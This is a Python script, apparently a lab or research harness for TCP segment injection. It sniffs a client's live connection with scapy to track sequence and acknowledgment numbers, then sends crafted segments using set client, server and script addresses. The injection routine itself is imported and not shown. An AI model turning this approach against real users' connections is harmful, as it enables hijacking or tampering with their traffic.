import datetime
from time import sleep, time
from modTransmit import send_segments
from client import Webclient
from scapy.sendrecv import AsyncSniffer 
import logging
import sys

# send_segments(interface, 
#               script ip, 
#               client ip, 
#               server ip, 
#               script mac, 
#               client mac, 
#               server mac, 
#               seq, 
#               ack, 
#               script port, 
#               client port, 
#               server port)

INTERFACE_SCRIPT = ""
INTERFACE_CLIENT = ""
CLIENT_INFORMATION= ('192.168.0.197',54321,'f8:59:71:ec:fd:1f')
SERVER_INFORMATION= ('134.96.225.80',8080 ,'f8:59:71:ec:fd:1f')
SCRIPT_INFORMATION= ('192.168.0.197',55555,'f8:59:71:ec:fd:1f')
SECONDARY_PORT = 55553


SEQ = 0
ACK = 0

def set_seq(packet):
    global SEQ
    global ACK
    if packet.sprintf('%TCP.flags%')=='A':
        SEQ = packet.ack
        ACK = packet.seq

def run():

    try:
        www = Webclient((SERVER_INFORMATION[0],SERVER_INFORMATION[1]),(CLIENT_INFORMATION[0],CLIENT_INFORMATION[1]))
        sniffer = AsyncSniffer(iface=INTERFACE_CLIENT,prn=set_seq,filter=f"tcp and dst port {CLIENT_INFORMATION[1]}")

        sniffer.start()
        www.start()

        sleep(0.5)
        if www.FINISHED:
            raise Exception("Client did not run")
        logging.info(f"[+] Client started")

        startTime = time()

        if send_segments(INTERFACE_SCRIPT, SCRIPT_INFORMATION[0],CLIENT_INFORMATION[0], SERVER_INFORMATION[0],
                        SCRIPT_INFORMATION[2],CLIENT_INFORMATION[2],SERVER_INFORMATION[2],SEQ,ACK,
                        SCRIPT_INFORMATION[1],CLIENT_INFORMATION[1],SERVER_INFORMATION[1]) != 1:
            raise Exception(f"Segments could not be send")

        if send_segments(INTERFACE_SCRIPT, SCRIPT_INFORMATION[0],CLIENT_INFORMATION[0], SERVER_INFORMATION[0],
                        SCRIPT_INFORMATION[2],CLIENT_INFORMATION[2],SERVER_INFORMATION[2],SEQ,ACK,
                        SECONDARY_PORT,CLIENT_INFORMATION[1],SERVER_INFORMATION[1]) != 1:
            raise Exception(f"Segments could not be send")

        currentTime = str(datetime.timedelta(seconds=round(time()-startTime)))
        print(f"[+] Current time: {currentTime}")

    except Exception as e:
        logging.error(f"[!] Error: {e}")
        sys.exit(-1)
    finally:
        sniffer.stop()
        www.abort_webserver()
        www.join()
        for i in range(10):
            if www.FINISHED:
                break
            sleep(0.2)
        endTime = time()
        print("\n")
        logging.info(f"[+] Finished in {str(datetime.timedelta(seconds=round(endTime-startTime)))}")
    
    return 1

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("[?] Usage: python3 run.py <amount> <script interface> <client interface>")
    
    amount = int(sys.argv[1])
    INTERFACE_SCRIPT = sys.argv[2]
    INTERFACE_CLIENT = sys.argv[3]

    logging.basicConfig(filename="run.log",level=logging.INFO,format="%(asctime)s %(message)s")

    run()